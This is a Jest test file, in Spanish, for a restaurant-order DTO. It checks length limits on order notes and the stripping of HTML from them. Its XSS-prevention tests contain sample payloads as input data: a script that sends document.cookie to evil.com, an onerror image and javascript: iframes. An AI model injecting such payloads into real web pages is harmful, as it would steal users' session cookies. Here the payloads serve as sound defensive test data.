import 'reflect-metadata';

import { validate } from 'class-validator';
import { plainToInstance } from 'class-transformer';
import { CrearPedidoDto } from '../../src/pedidos/dto/crear-pedido.dto';

describe('CrearPedidoDto - Validación de Observaciones (BL-41)', () => {
  const baseDto = {
    restauranteId: '22222222-2222-2222-2222-222222222222',
    mesaId: '33333333-3333-3333-3333-333333333333',
    idempotencyKey: 'test-key-123',
    items: [
      { itemCartaId: '55555555-5555-5555-5555-555555555555', cantidad: 1 },
    ],
  };

  describe('Observación de Ítem (límite 300 caracteres)', () => {
    it('debe ser válido cuando la observación tiene exactamente 300 caracteres', async () => {
      const dto = plainToInstance(CrearPedidoDto, {
        ...baseDto,
        items: [{ ...baseDto.items[0], observacion: 'a'.repeat(300) }],
      });
      const errors = await validate(dto);
      const itemErrors = errors
        .find((e) => e.property === 'items')
        ?.children?.[0]?.children?.find((c) => c.property === 'observacion');

      expect(itemErrors).toBeUndefined();
    });

    it('debe ser rechazado cuando la observación tiene 301 caracteres', async () => {
      const dto = plainToInstance(CrearPedidoDto, {
        ...baseDto,
        items: [{ ...baseDto.items[0], observacion: 'a'.repeat(301) }],
      });
      const errors = await validate(dto);
      const itemErrors = errors
        .find((e) => e.property === 'items')
        ?.children?.[0]?.children?.find((c) => c.property === 'observacion');

      expect(itemErrors).toBeDefined();
      expect(itemErrors?.constraints?.maxLength).toBe(
        'La nota del ítem no puede exceder 300 caracteres',
      );
    });

    it('debe ser válido cuando el campo está ausente o vacío', async () => {
      const dtoAusente = plainToInstance(CrearPedidoDto, baseDto);
      expect(await validate(dtoAusente)).toHaveLength(0);

      const dtoVacio = plainToInstance(CrearPedidoDto, {
        ...baseDto,
        items: [{ ...baseDto.items[0], observacion: '' }],
      });
      expect(await validate(dtoVacio)).toHaveLength(0);
    });
  });

  describe('Observación General del Pedido (límite 500 caracteres)', () => {
    it('debe ser válido cuando la observación general tiene exactamente 500 caracteres', async () => {
      const dto = plainToInstance(CrearPedidoDto, {
        ...baseDto,
        observacionGeneral: 'b'.repeat(500),
      });
      const errors = await validate(dto);
      const generalErrors = errors.find((e) => e.property === 'observacionGeneral');

      expect(generalErrors).toBeUndefined();
    });

    it('debe ser rechazado cuando la observación general tiene 501 caracteres', async () => {
      const dto = plainToInstance(CrearPedidoDto, {
        ...baseDto,
        observacionGeneral: 'b'.repeat(501),
      });
      const errors = await validate(dto);
      const generalErrors = errors.find((e) => e.property === 'observacionGeneral');

      expect(generalErrors).toBeDefined();
      expect(generalErrors?.constraints?.maxLength).toBe(
        'La nota general del pedido no puede exceder 500 caracteres',
      );
    });

    it('debe ser válido cuando el campo está ausente o vacío', async () => {
      const dtoAusente = plainToInstance(CrearPedidoDto, baseDto);
      expect(await validate(dtoAusente)).toHaveLength(0);

      const dtoVacio = plainToInstance(CrearPedidoDto, {
        ...baseDto,
        observacionGeneral: '',
      });
      expect(await validate(dtoVacio)).toHaveLength(0);
    });
  });

  describe('Sanitización de observaciones (prevención XSS)', () => {
    it('debe eliminar etiquetas HTML de la observación del ítem', async () => {
      const dto = plainToInstance(CrearPedidoDto, {
        ...baseDto,
        items: [
          {
            ...baseDto.items[0],
            observacion: '<script>alert("xss")</script>Texto normal<b>negrita</b>',
          },
        ],
      });

      const errors = await validate(dto);
      expect(errors.filter((e) => e.property === 'items')).toHaveLength(0);

      // La transformación debe haber eliminado <script>, </script>, <b> y </b>
      expect(dto.items[0].observacion).toBe('alert("xss")Texto normalnegrita');
    });

    it('debe eliminar etiquetas HTML de la observación general', async () => {
      const dto = plainToInstance(CrearPedidoDto, {
        ...baseDto,
        observacionGeneral: '<iframe src="evil.com"></iframe>Alergia al maní',
      });

      const errors = await validate(dto);
      expect(errors.filter((e) => e.property === 'observacionGeneral')).toHaveLength(0);

      expect(dto.observacionGeneral).toBe('Alergia al maní');
    });

    it('debe eliminar scripts, iframes y etiquetas peligrosas', async () => {
      const payloadMalicioso =
        '<script>document.location="http://evil.com/steal?cookie="+document.cookie</script>' +
        '<img src=x onerror=alert(1)>' +
        '<iframe src="javascript:alert(1)"></iframe>' +
        'Texto legítimo';

      const dto = plainToInstance(CrearPedidoDto, {
        ...baseDto,
        items: [{ ...baseDto.items[0], observacion: payloadMalicioso }],
      });

      expect(dto.items[0].observacion).not.toContain('<script>');
      expect(dto.items[0].observacion).not.toContain('<iframe');
      expect(dto.items[0].observacion).not.toContain('onerror');
      expect(dto.items[0].observacion).toContain('Texto legítimo');
    });

    it('debe manejar correctamente valores undefined y null', async () => {
      const dtoSinObservaciones = plainToInstance(CrearPedidoDto, baseDto);
      const errors = await validate(dtoSinObservaciones);
      expect(errors).toHaveLength(0);

      expect(dtoSinObservaciones.items[0].observacion).toBeUndefined();
      expect(dtoSinObservaciones.observacionGeneral).toBeUndefined();
    });
  });
});
